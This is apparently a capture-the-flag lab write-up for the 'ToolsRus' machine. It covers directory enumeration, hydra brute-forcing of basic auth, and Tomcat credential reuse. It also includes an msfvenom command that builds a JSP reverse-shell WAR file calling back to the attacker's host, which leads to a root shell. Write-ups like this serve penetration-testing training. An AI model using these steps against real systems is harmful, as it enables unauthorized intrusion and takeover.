ToolsRus

Target IP: 10.10.190.221

Enumerate a server, gather information along the way that will eventually lead to you taking over the machine.

Reconnaissance


There are two TCP ports open on the target machine: SSH and HTTP on their standard port number.

Enumeration

Port 80: HTTP


The webpage above is displayed for this application. The source-code of this page does not reveal anything useful either. Time for a directory search.


Doing a directory search with the command gobuster dir -u http://10.10.190.221/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt shows the interesting entries above.


Browsing to /guidelines reveals a username called bob as shown above. And apparently there is a TomCat server too.


A login prompt is displayed for /protected. I tried default credentials, such as admin:admin and root:root, but I had no luck. Sending a curl request to this page shows it is using a basic authentication prompt. Maybe I can bruteforce the password for the username bob using the tool hydra?


And bingo! I managed to bruteforce and identify the password bubbles of the user bob.


After logging in with the credential bob:bubbles, the webpage above is displayed. Is the application active on a different port now?


Doing an nmap scan shows there are two more ports open on the ports 1234 and 8009.


I found the TomCat application now at port 1234. The target is running Apache Tomcat/7.0.88.


I notice the user bob likes to reuse his credential. I am able to login to the TomCat server application using the same credential bob:bubbles. Now I can upload a malicious war file and obtain a reverse shell connection!

Exploitation & Flag


I created a malicious war shell using msfvenom with the command msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.55.153 LPORT=8443 -f war > shell.war. Then I started a listener on port 8443 on my machine. To start the reverse shell, I browsed to http://10.10.190.221:1234/shell. Now I have a reverse shell connection with the session as root.


No need to perform privilege escalation on this machine, as the session I obtain is as root. There is only one flag called root.txt which is located at /root. GG.
